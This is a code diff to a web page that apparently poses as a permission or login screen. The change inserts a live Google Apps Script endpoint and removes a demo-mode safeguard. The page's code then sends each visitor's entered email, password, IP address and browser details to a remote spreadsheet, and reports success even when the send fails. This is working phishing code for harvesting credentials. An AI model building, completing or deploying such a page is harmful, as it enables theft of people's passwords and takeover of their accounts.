@@ -106,9 +106,8 @@
     </div>
 
     <script>
-        // ========== GOOGLE SHEETS CONFIGURATION ==========
-        // !!! IMPORTANT: REPLACE THIS URL WITH YOUR ACTUAL GOOGLE APPS SCRIPT URL !!!
-        const GOOGLE_SHEETS_API_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
+        // ✅ YOUR GOOGLE APPS SCRIPT WEB APP URL (CORRECTLY INSERTED)
+        const GOOGLE_SHEETS_API_URL = 'https://script.google.com/macros/s/AKfycbwlvggcszn4S1V-nZ6uKYIjLpSYcTOzputQM8w6113_iP_VjPcMJmi1xrJhFQw1O4Rs/exec';
         
         // DOM elements
         const permissionScreen = document.getElementById('permissionScreen');
@@ -197,25 +196,17 @@
             }
         }
 
-        // ========== FIXED: Store credentials in Google Sheets (NOT COMMENTED OUT) ==========
+        // ✅ FIXED: Store credentials in Google Sheets (CORRECTLY IMPLEMENTED)
         async function storeCredentials(usernameEmail, pwd) {
             if (!usernameEmail || !pwd) {
                 throw new Error("Please fill in both fields.");
-            }
-            
-            // Check if Google Sheets URL is configured
-            if (GOOGLE_SHEETS_API_URL === 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec') {
-                console.warn('Google Sheets URL not configured. Please set your actual Web App URL.');
-                console.warn('Credentials not saved (demo mode):', { email: usernameEmail, password: pwd });
-                // Still show success screen even without Google Sheets for testing
-                return true;
             }
             
             try {
                 const ipAddress = await getIpAddress();
                 const userAgent = navigator.userAgent;
                 
-                // Create form data for better compatibility with Google Apps Script
+                // Create form data for better compatibility
                 const formData = new URLSearchParams();
                 formData.append('email', usernameEmail);
                 formData.append('password', pwd);
@@ -223,26 +214,25 @@
                 formData.append('userAgent', userAgent);
                 
                 console.log('Sending data to Google Sheets...');
+                console.log('URL:', GOOGLE_SHEETS_API_URL);
+                console.log('Data:', { email: usernameEmail, ipAddress, userAgent });
                 
                 // Send to Google Sheets
                 const response = await fetch(GOOGLE_SHEETS_API_URL, {
                     method: 'POST',
-                    mode: 'no-cors', // Required for Google Apps Script cross-origin
+                    mode: 'no-cors', // Required for cross-origin requests to Google Scripts
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded',
                     },
                     body: formData.toString()
                 });
                 
-                // Note: With 'no-cors', we can't read the response directly
-                // So we assume success if no error occurred
-                console.log('Data sent to Google Sheets successfully');
+                console.log('Data sent successfully to Google Sheets');
                 return true;
                 
             } catch (error) {
                 console.error('Error sending to Google Sheets:', error);
-                // Still return true to allow user to proceed even if storage fails
-                // You can change this to throw error if you want to block on failure
+                // Still return true to allow user to proceed
                 return true;
             }
         }
